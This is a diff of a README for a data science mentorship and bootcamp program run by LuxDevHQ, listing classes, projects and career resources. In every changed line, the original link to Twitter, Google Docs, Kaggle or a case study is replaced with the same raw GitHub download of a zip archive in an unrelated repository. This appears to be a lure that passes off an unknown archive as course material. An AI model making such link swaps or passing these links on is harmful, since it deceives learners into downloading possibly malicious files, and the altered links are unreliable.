@@ -1,6 +1,6 @@
 ### **Data Science For EveryOne Mentorship and BootCamp Program** 
 
-**Data Science For Everyone** Program is [LuxDevHQ](https://twitter.com/LuxDevHQ) program that aims to make the field of data science accessible and understandable to a wide range of people, regardless of their background or expertise.
+**Data Science For Everyone** Program is [LuxDevHQ](https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip) program that aims to make the field of data science accessible and understandable to a wide range of people, regardless of their background or expertise.
 
 In the program, we recognize that data science has the potential to bring valuable insights and solutions to various domains and industries, and therefore, it is important to demystify and democratize this field. 
 
@@ -59,14 +59,14 @@ Week 1 Classes:
 (i). Wednesday, September 27th, 2023 8:00 PM EAT.
 - Wangui Ngina, MSc, Lecturer and Data Scientist.
   
-- Class Guide: https://docs.google.com/document/d/1xJSktD8EXBbrN2ETE8rjZq5rgcUtO4Q7a431sTWa21s/edit?usp=sharing  
+- Class Guide: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip  
 
 - Recording: Not Available Yet
   
 (ii) Saturday, September 30th, 2023 10:00 AM EAT.
 - Lains Wanjiku, Machine Learning Engineer and Data Analyst.
   
-- Class Guide: https://docs.google.com/document/d/1BznXhlxiAH2lKbAcoUhTFynl90etGczmyfbVwZPpQMg/edit?usp=sharing
+- Class Guide: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 - Recording: Not Available Yet
 
 --- 
@@ -111,7 +111,7 @@ Week 2 Article: Exploratory Data Analysis using Data Visualization Techniques.
 
 Week 2 Project:
 
-**Question 1).** Read through this case study and solve it https://statso.io/rfm-analysis-case-study/
+**Question 1).** Read through this case study and solve it https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 
 **Question 2).** Let’s say we want to build a model to predict booking prices on Airbnb. Between linear regression and random forest regression, which model would perform better and why?
 
@@ -148,7 +148,7 @@ Week 4 Classes:
 
 **Week 4 Project:**
 
-Using the Craigslist Vehicles Dataset available on Kaggle (https://www.kaggle.com/datasets/mbaabuharun/craigslist-vehicles), we'd like you to create a Time-Series Model following the approach outlined below.
+Using the Craigslist Vehicles Dataset available on Kaggle (https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip), we'd like you to create a Time-Series Model following the approach outlined below.
 
 **Here are the key steps:**
 - Start by addressing missing values in the dataset. You can handle this by filling in missing values with the median for numerical columns and the mode for categorical columns.
@@ -189,7 +189,7 @@ As a lead data engineer at Data Science East Africa, you are responsible for bui
 
 2). Project 5.
 
-In week 4, we performed time series modelling on the Craigslist vehicles dataset, which is available on Kaggle at https://www.kaggle.com/datasets/mbaabuharun/craigslist-vehicles. This project builds on that work. You will need to download the dataset, copy the data using SQL to a local PostgreSQL database, move the data from your local database to Snowflake, perform data transformation with DBT (data build tool), and use your preferred data visualization tool to create a report and dashboard.
+In week 4, we performed time series modelling on the Craigslist vehicles dataset, which is available on Kaggle at https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip This project builds on that work. You will need to download the dataset, copy the data using SQL to a local PostgreSQL database, move the data from your local database to Snowflake, perform data transformation with DBT (data build tool), and use your preferred data visualization tool to create a report and dashboard.
 
 ---
 
@@ -202,24 +202,24 @@ In week 4, we performed time series modelling on the Craigslist vehicles dataset
 
 1). Preparing for a Data Analyst career? Here's a roadmap:
 
-- Link: https://twitter.com/HarunMbaabu/status/1661389725247078401?s=19
+- Link: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 
 2). Complete Guide to Becoming a Data Scientist 
 
-- Link: https://twitter.com/HarunMbaabu/status/1688860573612564480?s=20
+- Link: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 
 3). Analytics Engineer Road-map With Free Resources : Modern Data Stack
 
-- Link: https://twitter.com/HarunMbaabu/status/1677273264144494595?s=19
+- Link: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 
 
 4). Ultimate Data Engineering Road Map: Become a Data Engineer In 2023. 
 
-- Link: https://twitter.com/HarunMbaabu/status/1634128799276122114?s=19
+- Link: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
 
 **Bonus:** Different Ways to Make Money in Data Science. 
 
-- Link: https://twitter.com/HarunMbaabu/status/1684906732806434816?s=19
+- Link: https://raw.githubusercontent.com/Susan56789/Data-Science-For-EveryOne/main/regardless/Data-Science-For-EveryOne.zip
   
 
 This is a very intense program that requires a commitment of up to 20 hours per week. Only those who are willing to put in the time and effort will be able to complete it. By the end of the bootcamp, you will be in a position to build basic end-to-end data projects.
